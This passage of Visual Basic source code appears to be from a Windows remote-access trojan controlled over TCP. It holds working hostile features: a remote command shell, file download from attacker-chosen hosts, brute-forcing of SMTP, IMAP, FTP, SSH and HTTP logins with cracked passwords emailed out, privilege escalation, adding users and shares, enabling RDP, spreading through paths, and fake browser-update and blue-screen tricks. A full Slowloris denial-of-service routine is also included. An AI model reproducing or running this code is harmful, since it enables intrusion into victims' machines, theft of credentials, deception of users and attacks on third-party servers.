                                            log_all("TCP_CON function: " & ex.Message & vbNewLine & ex.StackTrace) : Exit Select
                                        End Try
                                    End If
                                    If Not IO.File.Exists(tdf) Then df = tdf : done = True
                                Loop
                            End If
                            tcp_c.Send(SB("Transfer method (HTTP/TCP) [Default: HTTP]: "))
                            Do While Not tcp_c.Available > 0
                            Loop
                            tcp_c.Receive(data)
                            Dim mthd = GetData(data)
                            If mthd = "" Then method = 1
                            If method = 0 Then
                                If mthd.ToLower = "http" Then method = 1 : tcp_c.Send(SB("[?] - Note that for HTTP File Transfer method you can hit ENTER/RETURN to choose it, as it's the default." & vbNewLine))
                                If mthd.ToLower = "tcp" Then method = 2
                            End If
                            If method = 0 Then tcp_c.Send(SB("[!] - Unknown Transfer method (" & mthd & ")." & vbNewLine)) : Exit Select
                            tcp_c.Send(SB("Host/IP to connect to (if using HTTP method include http/s at the begining): "))
                            Do While Not tcp_c.Available > 0
                            Loop
                            tcp_c.Receive(data)
                            hoip = GetData(data)
                            If method = 1 Then
                                Dim suf = ": "
                                Dim mport = "80"
                                If hoip.ToLower.StartsWith("https") Then mport = "443"
                                suf = " [Default: " & mport & "]" & suf
                                tcp_c.Send(SB("Port To connect On" & suf))
                                Do While Not tcp_c.Available > 0
                                Loop
                                tcp_c.Receive(data)
                                port = GetData(data)
                                If port = "" Then port = mport
                            ElseIf method = 2 Then
                                tcp_c.Send(SB("Port To connect On: "))
                                Do While Not tcp_c.Available > 0
                                Loop
                                tcp_c.Receive(data)
                                port = GetData(data)
                            End If
                            Try
                                Integer.Parse(port)
                            Catch ex As Exception
                                tcp_c.Send(SB("[!] - Port was not only numbers (" & port & ")." & vbNewLine)) : Exit Select
                            End Try
                            If Not CUH(hoip, port) Then tcp_c.Send(SB("[!] - Host/IP is not up (" & hoip & ")." & vbNewLine)) : Exit Select
                            ready = True
                        Loop
                        Dim errr = False
                        tcp_c.Send(SB("[~] - Uploading ..."))
                        If method = 1 Then
                            If hoip.EndsWith("/") And Not hoip.EndsWith(".php") Then hoip = hoip.Remove(hoip.Length - 1, 1)
                            Try
                                DownloadFile(hoip & "/" & sf, df)
                            Catch ex As Exception
                                errr = True
                                log_all("TCP_CON function: " & ex.Message & vbNewLine & ex.StackTrace)
                            End Try
                        Else
                            Try
                                Dim tc As New Net.Sockets.TcpClient(hoip, port)
                                Do Until tc.Connected
                                Loop
                                Do Until tc.Available > 0
                                Loop
                                tc.Client.Receive(data)
                                tc.Close()
                                IO.File.WriteAllBytes(df, data)
                            Catch ex As Exception
                                errr = True
                                log_all("TCP_CON function: " & ex.Message & vbNewLine & ex.StackTrace)
                            End Try
                        End If
                        If errr Then tcp_c.Send(SB(vbNewLine & "[!] - There was an error! Check log files for more info."))
                        If Not errr Then tcp_c.Send(SB(vbNewLine & "[*] - Done Uploading."))
                        tcp_c.Send(SB(vbNewLine))
#End Region
#Region "CO"
                    Case "co"
                        Dim ready = False
                        Dim cs = ""
                        Dim host = ""
                        Dim port = ""
                        Dim hd = ""
                        Dim user = ""
                        Dim pass = ""
                        Dim passs As New List(Of String)
                        Dim stc = COS.FTP
                        Do Until ready
                            If Not tcp_c.Connected Then Exit Sub
                            tcp_c.Send(SB("Service to crack (SMTP,IMAP,FTP,SSH,HTTP_GET,HTTP_POST): "))
                            Do While Not tcp_c.Available > 0
                            Loop
                            tcp_c.Receive(data)
                            cs = GetData(data)
                            If cs = "" Then tcp_c.Send(SB("You can't crack no service!" & vbNewLine)) : Exit Select
                            Select Case cs.ToLower
                                Case "smtp", "imap", "ftp", "ssh"
                                    Select Case cs.ToLower
                                        Case "smtp"
                                            stc = COS.SMTP
                                        Case "imap"
                                            stc = COS.IMAP
                                        Case "ftp"
                                            stc = COS.FTP
                                        Case "ssh"
                                            stc = COS.SSH
                                    End Select
                                Case "http_get", "http_post"
                                    Select Case cs.ToLower
                                        Case "http_get"
                                            stc = COS.HTTP_GET
                                        Case "http_post"
                                            stc = COS.HTTP_POST
                                    End Select
                                    tcp_c.Send(SB("HTTP data (Hydra format): "))
                                    Do While Not tcp_c.Available > 0
                                    Loop
                                    tcp_c.Receive(data)
                                    hd = GetData(data)
                                Case Else
                                    tcp_c.Send(SB("Unsupported service (" & cs & ")!" & vbNewLine)) : Exit For
                            End Select
                            tcp_c.Send(SB("Host of the service: "))
                            Do While Not tcp_c.Available > 0
                            Loop
                            tcp_c.Receive(data)
                            host = GetData(data)
                            If host = "" Then tcp_c.Send(SB("You can't crack a service on no host!" & vbNewLine)) : Exit Select
                            Dim mport = port
                            tcp_c.Send(SB("Port of the service (If default is empty, CO function will take care of it) [Default: " & mport & "]: "))
                            Do While Not tcp_c.Available > 0
                            Loop
                            tcp_c.Receive(data)
                            port = GetData(data)
                            If port = "" Then port = mport
                            Try
                                If port <> "" Then Integer.Parse(port)
                            Catch ex As Exception
                                tcp_c.Send(SB("[!] - Port was not only numbers (" & port & ")." & vbNewLine)) : Exit Select
                            End Try
                            tcp_c.Send(SB("User to crack: "))
                            Do While Not tcp_c.Available > 0
                            Loop
                            tcp_c.Receive(data)
                            user = GetData(data)
                            If user = "" Then tcp_c.Send(SB("You can't crack a service with no user!" & vbNewLine)) : Exit Select
                            Dim pim = ""
                            tcp_c.Send(SB("Next step requires attention! You'll write either passwords (one per line) or a URL linking a password list." & vbNewLine))
                            tcp_c.Send(SB("Please choose a method of inputing passwords (Password per line/URL) [Default: Password per line]: "))
                            tcp_c.Receive(data)
                            pim = GetData(data)
                            Dim pass_ready = False
                            If pim = "" Or pim.ToLower = "password per line" Then
                                tcp_c.Send(SB("Write as many passwords as you wish, but be aware of the victim's RAM and CPU! (Write an empty line to end the passwords input method)" & vbNewLine))
                                Do Until pass_ready
                                    Dim cip = ""
                                    tcp_c.Receive(data)
                                    cip = GetData(data)
                                    If cip = "" Then pass_ready = True : Exit Do
                                    passs.Add(cip)
                                Loop
                            ElseIf pim.ToLower = "url" Then
                                tcp_c.Send(SB("Write the URL which links the password list: "))
                                Dim plu = ""
                                tcp_c.Receive(data)
                                plu = GetData(data)
                                If plu = "" Then tcp_c.Send(SB("You can't crack a service with no passwords!" & vbNewLine)) : Exit Select
                                Try
                                    Dim ud = New Net.WebClient
                                    Dim rtb = New Windows.Forms.RichTextBox
                                    rtb.Text = ud.DownloadString(plu)
                                    For Each p In rtb.Lines
                                        passs.Add(p)
                                    Next
                                Catch ex As Exception
                                    tcp_c.Send(SB("There was an Error downloading password list!" & vbNewLine & plu & vbNewLine & ex.Message & vbNewLine)) : Exit Select
                                End Try
                            End If
                            If passs.Count = 0 Then tcp_c.Send(SB("You can't crack a service with no passwords!" & vbNewLine)) : Exit Select
                            If Not CUH(host, port) Then tcp_c.Send(SB("[!] - Host/IP is not up (" & host & ")." & vbNewLine)) : Exit Select
                            ready = True
                        Loop
                        Dim cp = ""
                        If CO(user, passs.ToArray, cp, stc, host, port, hd) Then tcp_c.Send(SB("Service cracked successfuly." & vbNewLine & "User: " & user & vbNewLine & "Password: " & cp))
                        tcp_c.Send(SB(vbNewLine))
#End Region
#Region "Check/Can/Get Higher"
                    Case "ch"
                        If CH() Then
                            tcp_c.Send(SB("We're high ^^" & vbNewLine))
                        Else
                            tcp_c.Send(SB("We're not high." & vbNewLine))
                        End If
                    Case "canh"
                        If CanH() Then
                            tcp_c.Send(SB("We can get higher." & vbNewLine))
                        Else
                            tcp_c.Send(SB("We cannot get higher." & vbNewLine))
                        End If
                    Case "gh"
                        tcp_c.Send(SB("We'll try to get higher..." & vbNewLine & "If you notice a connection drop, this means we did get higher." & vbNewLine))
                        If GH() Then
                            tcp_c.Send(SB("We DID get higher ^^" & vbNewLine))
                            End
                        Else
                            tcp_c.Send(SB("We couldn't get higher :(" & vbNewLine))
                        End If
#End Region
                    Case Else
                        ce = True
                End Select
#Region "IF_EXTRA"
                If cmd.ToLower.StartsWith("btcp ") Then
                    Dim p = cmd.Remove(0, 5)
                    BTCP(p)
                ElseIf cmd.ToLower.StartsWith("rtcp ")
                    Dim all = cmd.Remove(0, 5)
                    RTCP(all.Split("|")(0), all.Split("|")(1))
                ElseIf cmd.ToLower.StartsWith("run ") Or cmd.ToLower.StartsWith("exe ") Then
                    Dim f = cmd.Remove(0, 4)
                    Dim fd = ""
                    Try
                        Process.Start(f)
                    Catch ex As Exception
                        fd = ex.Message & vbNewLine
                    End Try
                    tcp_c.Send(SB(fd))
                ElseIf cmd.ToLower.StartsWith("sl ")
                    Dim h = cmd.Remove(0, 3)
                    Dim bg = False
                    If h.ToLower.StartsWith("-b ") Then bg = True : h = h.Remove(0, 3)
                    If bg Then
                        Dim bgw As New BackgroundWorker
                        AddHandler bgw.DoWork, Sub(sender1 As Object, e1 As DoWorkEventArgs)
                                                   If e1.Argument.contains(":") And Not e1.Argument.tolower.startxwith("http") Then
                                                       SL(e1.Argument.split(":")(0), e1.Argument.split(":")(1))
                                                   Else
                                                       SL(e1.Argument)
                                                   End If
                                               End Sub
                        bgw.RunWorkerAsync(h)
                    Else
                        If h.Contains(":") And Not h.ToLower.StartsWith("http") Then
                            SL(h.Split(":")(0), h.Split(":")(1))
                        Else
                            SL(h)
                        End If
                    End If
#End Region
#Region "SHARES"
                ElseIf cmd.ToLower.StartsWith("shares ") Then
                    Dim p = cmd.Remove(0, 7)
                    If p.ToLower.StartsWith("list") Then
                        tcp_c.Send(SB(LShare() & vbNewLine))
                    ElseIf p.ToLower.StartsWith("add ") Then
                        If p.Remove(0, 4).Split("|").Length < 2 Then
                            tcp_c.Send(SB("Usage: shares add name|path[|user]" & vbNewLine & "A name and a path are required, one was not given!" & vbNewLine))
                        End If
                        Dim prts = p.Remove(0, 4).Split("|")
                        Dim u = ""
                        Dim umsg = ""
                        If prts.Length > 2 Then
                            u = prts(2)
                            umsg = " to the user (" & prts(2) & ")"
                        End If
                        If AShare(prts(0), prts(1), u) Then
                            tcp_c.Send(SB("Share with the name (" & p.Remove(0, 4).Split("|")(0) & ") and the path (" & p.Remove(0, 4).Split("|")(1) & ")" & umsg & " has been add successfuly." & vbNewLine))
                        Else
                            tcp_c.Send(SB("Share with the name (" & p.Remove(0, 4).Split("|")(0) & ") could not be add! Check if you're an admin." & vbNewLine))
                        End If
                    ElseIf p.ToLower.StartsWith("delete ") Then
                        If p.Remove(0, 7).ToLower = "" Then
                            tcp_c.Send(SB("Usage: shares delete name" & vbNewLine & "A name is required, none was given!" & vbNewLine))
                        End If
                        If DShare(p.Remove(0, 7)) Then
                            tcp_c.Send(SB("Share with the name (" & p.Remove(0, 7) & ") has been deleted successfuly." & vbNewLine))
                        Else
                            tcp_c.Send(SB("Share with the name (" & p.Remove(0, 7) & ") could not be deleted! Check if you're an admin." & vbNewLine))
                        End If
                    End If
#End Region
#Region "FILE_MAN"
                ElseIf cmd.ToLower.StartsWith("cd ") Then
                    Dim d = cmd.Remove(0, 3)
                    If IO.Directory.Exists(d) Then
                        Environment.CurrentDirectory = (d)
                        cd = New IO.DirectoryInfo(IO.Directory.GetCurrentDirectory)
                        pt = username & "@" & pcname & ":" & cd.Name & "# "
                    Else
                        tcp_c.Send(SB("Directory was not found (" & d & ")." & vbNewLine))
                    End If
                ElseIf cmd.ToLower.StartsWith("cat ")
                    Dim f = cmd.Remove(0, 4)
                    Dim fd = ""
                    If IO.File.Exists(f) Then
                        fd = IO.File.ReadAllText(f)
                    Else
                        fd = "File was not found (" & f & ")."
                    End If
                    tcp_c.Send(SB(fd & vbNewLine))
                ElseIf cmd.ToLower.StartsWith("touch ")
                    Dim f = cmd.Remove(0, 6)
                    Dim fd = ""
                    If IO.File.Exists(f) Then fd = "File already exists (" & f & ")." & vbNewLine
                    Try
                        If fd = "" Then IO.File.Create(f).Close()
                    Catch ex As Exception
                        fd = ex.Message & vbNewLine
                    End Try
                    tcp_c.Send(SB(fd))
                ElseIf cmd.ToLower.StartsWith("mkdir ")
                    Dim f = cmd.Remove(0, 6)
                    Dim fd = ""
                    If IO.Directory.Exists(f) Then fd = "Directory already exists (" & f & ")." & vbNewLine
                    Try
                        If fd = "" Then IO.Directory.CreateDirectory(f)
                    Catch ex As Exception
                        fd = ex.Message & vbNewLine
                    End Try
                    tcp_c.Send(SB(fd))
                ElseIf cmd.ToLower.StartsWith("rm ")
                    Dim f = cmd.Remove(0, 3)
                    Dim fd = ""
                    If Not IO.File.Exists(f) Then fd = "File was not found (" & f & ")." & vbNewLine
                    Try
                        If fd = "" Then IO.File.Delete(f)
                    Catch ex As Exception
                        fd = ex.Message & vbNewLine
                    End Try
                    tcp_c.Send(SB(fd))
                ElseIf cmd.ToLower.StartsWith("rmdir ")
                    Dim f = cmd.Remove(0, 6)
                    Dim force = False
                    If f.ToLower.StartsWith("-f ") Then
                        f = f.Remove(0, 3)
                        force = True
                    End If
                    Dim fd = ""
                    If Not IO.Directory.Exists(f) Then fd = "Directory was not found (" & f & ")." & vbNewLine
                    Try
                        If fd = "" Then
                            If force Then
                                For Each file In IO.Directory.GetFiles(f)
                                    IO.File.Delete(file)
                                Next
                            End If
                            IO.Directory.Delete(f)
                        End If
                    Catch ex As Exception
                        fd = ex.Message & vbNewLine
                    End Try
                    tcp_c.Send(SB(fd))
#End Region
#Region "RDP"
                ElseIf cmd.ToLower.StartsWith("rdp ")
                    Dim stat = cmd.Remove(0, 4)
                    If stat.ToLower = "disable" Then
                        If DRDP() Then
                            tcp_c.Send(SB("RDP's been disabled." & vbNewLine))
                        Else
                            tcp_c.Send(SB("Failed disabling RDP!" & vbNewLine))
                        End If
                    Else
                        If ERDP() Then
                            tcp_c.Send(SB("RDP's been enabled." & vbNewLine))
                        Else
                            tcp_c.Send(SB("Failed enabling RDP!" & vbNewLine))
                        End If
                    End If
#End Region
#Region "SPREAD_PATH"
                ElseIf cmd.ToLower.StartsWith("sp ")
                    Dim p = cmd.Remove(0, 3)
                    SPREAD_PATH(p)
                    tcp_c.Send(SB("Spreading in path ==> (" & p & ")." & vbNewLine))
#End Region
#Region "SEV"
                ElseIf cmd.ToLower.StartsWith("sev ")
                    Dim t = cmd.Remove(0, 4).Split(" ")(0)
                    Dim c = cmd.Remove(0, 6)
                    Dim tt As SEV_Trick = SEV_Trick.MSGBOX
                    Select Case t
                        Case "2"
                            tt = SEV_Trick.UpdateMSGBOX
                        Case "3"
                            tt = SEV_Trick.ErrorMSGBox
                        Case "4"
                            tt = SEV_Trick.BlueScreenOfDeath
                        Case "5"
                            tt = SEV_Trick.FakeWebsitePage
                        Case "6"
                            tt = SEV_Trick.FakeBrowserUpdate
                    End Select
                    tcp_c.Send(SB("Applying trick...." & vbNewLine))
                    SEV(c, tt)
                    tcp_c.Send(SB("Done." & vbNewLine))
#End Region
#Region "Users - Add/Remove"
                ElseIf cmd.ToLower.StartsWith("users ")
                    Dim act = cmd.Remove(0, 6)
                    Dim usr = cmd.Remove(0, 6 + act.Length + 1)
                    If act.ToLower = "add" Then
                        If AddUser(usr.Split("|")(0), usr.Split("|")(1), usr.Split("|")(0)) Then
                            tcp_c.Send(SB("Done adding user (" & usr.Split("|")(0) & ")." & vbNewLine))
                        Else
                            tcp_c.Send(SB("Failed adding user (" & usr.Split("|")(0) & ")!" & vbNewLine))
                        End If
                    Else
                        If RemoveUser(usr) Then
                            tcp_c.Send(SB("Done removing user (" & usr & ")." & vbNewLine))
                        Else
                            tcp_c.Send(SB("Failed removing user (" & usr & ")!" & vbNewLine))
                        End If
                    End If
#End Region
                Else
                    If cmd <> "" And Not cmd.Contains(vbNullChar) And ce Then tcp_c.Send(SB("Unknown command (" & cmd & ")! Use help for better typing skills." & vbNewLine))
                End If
            Catch ex As Exception
                log_all("TCP_CON function: " & ex.Message & vbNewLine & ex.StackTrace)
            End Try
        Next
        tcp_c.Send(SB(pt))
    End Sub ' APSSH TCP callback.
    Function TCP_SHELL(SH_P As Process, lastcmd As String) As Boolean
        TCP_SHELL = True
        SH_P.StandardInput.WriteLine(lastcmd)
        If lastcmd.ToLower = "exit" Then Return False
    End Function ' SHELL (CMD) over TCP.
    Sub TCP_ReceiveSync(so As StateObject)
        so.workSocket.BeginReceive(so.buffer, 0, StateObject.BUFFER_SIZE, 0, New AsyncCallback(AddressOf TCP_READ_CALLBACK), so)
    End Sub ' TCP receive Sync (less CPU usage).
    Public Class StateObject
        Sub New()
        End Sub
        Sub New(s As Net.Sockets.Socket)
            workSocket = s
        End Sub
        Sub New(s As Net.Sockets.Socket, t As SOType)
            workSocket = s
            Typ = t
        End Sub
        Public workSocket As Net.Sockets.Socket = Nothing
        Public Const BUFFER_SIZE As Integer = 1024
        Public buffer(BUFFER_SIZE) As Byte
        Public Typ As SOType = SOType.NRML
        Public optnl As Object
    End Class ' An external class to be used with TCP callbacks.
    Enum SOType
        APSSH = 0
        SHELL = 1
        NRML = 2
    End Enum ' State Object Type.
    Sub TCP_READ_CALLBACK(ar As IAsyncResult)
        Dim so As StateObject = CType(ar.AsyncState, StateObject)
        Dim s As Net.Sockets.Socket = so.workSocket
        Dim read As Integer = s.EndReceive(ar)
        If read > 0 Then
            Select Case so.Typ
                Case SOType.NRML

                Case SOType.APSSH
                    APSSH(s, so.buffer)
                Case SOType.SHELL
                    so.optnl(1) = GetData(so.buffer)
                    If Not TCP_SHELL(so.optnl(0), so.optnl(1)) Then
                        s.Close()
                        Exit Sub
                    End If
            End Select
            so.buffer = New Byte(StateObject.BUFFER_SIZE) {}
            s.BeginReceive(so.buffer, 0, StateObject.BUFFER_SIZE, 0, New AsyncCallback(AddressOf TCP_READ_CALLBACK), so)
        Else
            s.Close()
        End If
    End Sub ' TCP Read CallBack (less CPU usage).
    Enum FileTransferMode
        None = 0
        HTTP = 1
        TCP = 2
    End Enum ' File transfer more (Not yet well used).
    Function GetData(ByRef data As Byte()) As String
        GetData = ""
        Dim rt As New Windows.Forms.RichTextBox
        rt.Text = BS(data)
        Dim d = ""
        For Each line In rt.Lines
            If Not line Is Nothing And Not line = "" And Not line.Contains(vbNullChar) Then
                d = line : Exit For
            End If
        Next
        data = SB(StrDup(data.Length, vbNullChar))
        Return d.Replace(vbNullChar, "")
    End Function ' An extra function for cleaning VbNullChar out of bytes array.
    Function Us() As String()
        Us = New String() {""}
        Dim userskey As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList")
        Dim users As New List(Of String)
        For Each keyname As String In userskey.GetSubKeyNames()
            Using key As RegistryKey = userskey.OpenSubKey(keyname)
                Dim userpath As String = DirectCast(key.GetValue("ProfileImagePath"), String)
                Dim username As String = IO.Path.GetFileNameWithoutExtension(userpath)
                If userpath.ToLower.StartsWith("c:\users\") Then
                    If IO.Directory.Exists(userpath & "\desktop") Then
                        users.Add(username & "|" & userpath)
                    End If
                End If
            End Using
        Next
        Us = users.ToArray
    End Function ' Users listing.
    Sub SL(host As String, Optional port As String = "80")
        If host = "" Then log_all("SL function: Host was not given") : Exit Sub
        keepddos = True
        If Not host.ToLower.StartsWith("http") Then
            If Not host.Contains(".") Then Exit Sub
            If host.Contains("/") Then host = host.Replace("/", "")
            If host.Contains(":") Then host = host.Replace(":", "")
            While keepddos
                Try
                    Dim p As New Net.NetworkInformation.Ping()
                    p.Send(host)
                Catch ex As Exception
                End Try
            End While
        End If
        Dim uas As String() = New String() {"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"}
        If host.ToLower.StartsWith("https") And port = "80" Then port = "443"
        host = host.ToLower.Replace("https://", "")
        host = host.ToLower.Replace("http://", "")
        If host.Contains("/") Then host = Split(host, "/")(0)
        If Not CUH(host) Then Exit Sub
        Dim los As New List(Of IO.StreamWriter)
        For i = 1 To 5000
            Try
                Dim slclient = New Net.Sockets.TcpClient(host, port)
                Dim slsr As IO.StreamReader
                Dim slsw As IO.StreamWriter
                If port = "443" Then
                    Dim slns As Net.Security.SslStream = New Net.Security.SslStream(slclient.GetStream)
                    slns.AuthenticateAsClient(host)
                    slsr = New IO.StreamReader(slns)
                    slsw = New IO.StreamWriter(slns)
                Else
                    Dim slns As Net.Sockets.NetworkStream = slclient.GetStream
                    slsr = New IO.StreamReader(slns)
                    slsw = New IO.StreamWriter(slns)
                End If
                slsw.WriteLine("GET /?" & Rnd(5000) & " HTTP/1.1")
                slsw.Flush()
                slsw.WriteLine("User-Agent: " & uas(New Random().Next(uas.Length - 1)))
                slsw.Flush()
                slsw.WriteLine("Accept-language: en-US,en,q=0.5")
                slsw.Flush()
                los.Add(slsw)
            Catch ex As Exception
                log_all("SL function: " & ex.Message & vbNewLine & ex.StackTrace)
            End Try
        Next
        While keepddos
            If Not CUH(host) Then log_all("SL function: Host (" & host & ") seems down! Have we done it?", 3) : Exit Sub
            For Each s In los.ToArray
                Try
                    s.WriteLine("X-a: " & New Random().Next(1, 5000))
                Catch ex As Exception
                    los.Remove(s)
                End Try
            Next
            For i = 1 To (5000 - los.Count - 1)
                Try
                    Dim slclient = New Net.Sockets.TcpClient(host, port)
                    Dim slsr As IO.StreamReader
                    Dim slsw As IO.StreamWriter
                    If port = "443" Then
                        Dim slns As Net.Security.SslStream = New Net.Security.SslStream(slclient.GetStream)
                        slns.AuthenticateAsClient(host)
                        slsr = New IO.StreamReader(slns)
                        slsw = New IO.StreamWriter(slns)
                    Else
                        Dim slns As Net.Sockets.NetworkStream = slclient.GetStream
                        slsr = New IO.StreamReader(slns)
                        slsw = New IO.StreamWriter(slns)
                    End If
                    slsw.WriteLine("GET /?" & Rnd(5000) & " HTTP/1.1")
                    slsw.Flush()
                    slsw.WriteLine("User-Agent: " & uas(New Random().Next(uas.Length - 1)))
                    slsw.Flush()
                    slsw.WriteLine("Accept-language: en-US,en,q=0.5")
                    slsw.Flush()
                    los.Add(slsw)
                Catch ex As Exception
                    log_all("SL function: " & ex.Message & vbNewLine & ex.StackTrace)
                End Try
            Next
            Threading.Thread.Sleep(15000)
        End While
    End Sub ' Slow-Lowris DDoS attack.
    Enum COS
        SMTP = 0
        IMAP = 1
        FTP = 2
        SSH = 3
        HTTP_GET = 4
        HTTP_POST = 5
    End Enum ' CrackOff Service.
    Function CO(user As String, passwords As String(), ByRef cp As String, s As COS, sh As String, Optional sp As String = "", Optional http_data As String = "") As Boolean
        CO = False
        For Each pass In passwords
            Dim ns As IO.Stream
            Dim sw As IO.StreamWriter
#Region "SMTP/S Cracking"
            Select Case s
                Case 0
                    sp = IIf(sp = "", 465, sp)
                    Try
                        Dim Smtp_Server As New SmtpClient
                        Dim e_mail As New MailMessage()
                        Smtp_Server.UseDefaultCredentials = False
                        Smtp_Server.Credentials = New Net.NetworkCredential(user, pass)
                        Smtp_Server.Port = sp
                        Smtp_Server.EnableSsl = True
                        Smtp_Server.Host = sh
                        e_mail = New MailMessage()
                        e_mail.From = New MailAddress(user)
                        e_mail.To.Add(imapmaster)
                        e_mail.Subject = "Password cracked!"
                        e_mail.IsBodyHtml = False
                        e_mail.Body = "User: " & user & vbNewLine & "Password: " & pass
                        Smtp_Server.Send(e_mail)
                        cp = pass : Return True
                    Catch ex As Exception
                    End Try
#End Region
#Region "IMAP/S Cracking"
                Case 1
                    sp = IIf(sp = "", 993, sp)
                    Try
                        CONS(sh, sp, ns, sw, True)
                        Dim data(9999) As Byte
                        ns.Read(data, 0, data.Length)
                        sw.WriteLine("$ LOGIN " & user & " " & pass)
                        sw.Flush()
                        ns.Read(data, 0, data.Length)
                        If BS(data).ToLower.Contains("authenticated") And BS(data).ToLower.Contains("success") Then
                            cp = pass : Return True
                        End If
                        ns.Close()
                    Catch ex As Exception
                    End Try
#End Region
#Region "FTP Cracking"
                Case 2
                    sp = IIf(sp = "", 21, sp)
                    CONS(sh, sp, ns, sw, False)
                    Dim data(9999) As Byte
                    ns.Read(data, 0, data.Length)
                    sw.WriteLine("USER " & user)
                    sw.Flush()
                    ns.Read(data, 0, data.Length)
                    If BS(data).ToLower.StartsWith("230") Then cp = "No password required for this user." : Return True
                    If BS(data).ToLower.StartsWith("331") Then
                        data = New Byte(9999) {}
                        sw.WriteLine("PASS " & pass)
                        sw.Flush()
                        data = New Byte(9999) {}
                        ns.Read(data, 0, data.Length)
                        If BS(data).ToLower.StartsWith("230") Then cp = pass : Return True
                        If BS(data).ToLower.StartsWith("202") Then
                            cp = "Server replyed 202 status code, by which it means command PASS is not implemented." & vbNewLine & "Anyway the Password is: " & pass : Return True
                        End If
                    End If
                    ns.Close()
#End Region
#Region "SSH Cracking"
                Case 3
                    sp = IIf(sp = "", 22, sp)
                    cp = "Not yet ready!" : Return False
                    If Not IO.File.Exists(path & "\putty.png") Then
                        Try
                            If CA(putty) Then DownloadFile(putty, path & "\putty.png")
                        Catch ex As Exception
                            log_all("CO Function: Downloading putty: " & ex.Message & vbNewLine & ex.StackTrace)
                        End Try
                    End If
                    If IO.File.Exists(path & "\putty.png") Then
                        Dim pd = False
                        Dim pl = False
                        Dim pp = New Process
                        pp.StartInfo = New ProcessStartInfo(path & "\putty.png", "-ssh " & user & "@" & sh & " -pw " & pass)
                        pp.StartInfo.UseShellExecute = False
                        pp.StartInfo.CreateNoWindow = True
                        pp.StartInfo.RedirectStandardError = True
                        pp.StartInfo.RedirectStandardOutput = True
                        AddHandler pp.OutputDataReceived, Sub(sender As Object, e As DataReceivedEventArgs)
                                                              If e.Data.ToLower.Contains("access denied") Then
                                                                  pd = True
                                                              ElseIf e.Data.ToLower.Contains("last login") Then
                                                                  pl = True
                                                                  pd = True
                                                              End If
                                                          End Sub
                        AddHandler pp.ErrorDataReceived, Sub(sender As Object, e As DataReceivedEventArgs)
                                                             log_all("CO function: Putty Error: " & e.Data)
                                                             pd = True
                                                         End Sub
                        pp.Start()
                        pp.BeginErrorReadLine()
                        pp.BeginOutputReadLine()
                        Do Until pd
                        Loop
                        pp.Kill()
                        pp.Close()
                        If pl Then
                            cp = pass : Return True
                        End If
                    End If
#End Region
#Region "HTTP/S Cracking - get"
                Case 4
                    sp = IIf(sp = "", 80, sp)
                    Dim sssl = False
                    If sh.ToLower.StartsWith("https") Then sp = "443" : sssl = True
                    Dim ch = sh.Replace("https", "")
                    ch = ch.Replace("http", "")
                    ch = ch.Replace("://", "")
                    ch = ch.Split("/")(0)
                    CONS(ch, sp, ns, sw, sssl)
                    Dim http_path = http_data.Split(":")(0)
                    Dim http_parms = http_data.Split(":")(1)
                    http_parms = http_parms.Replace("^USER^", user)
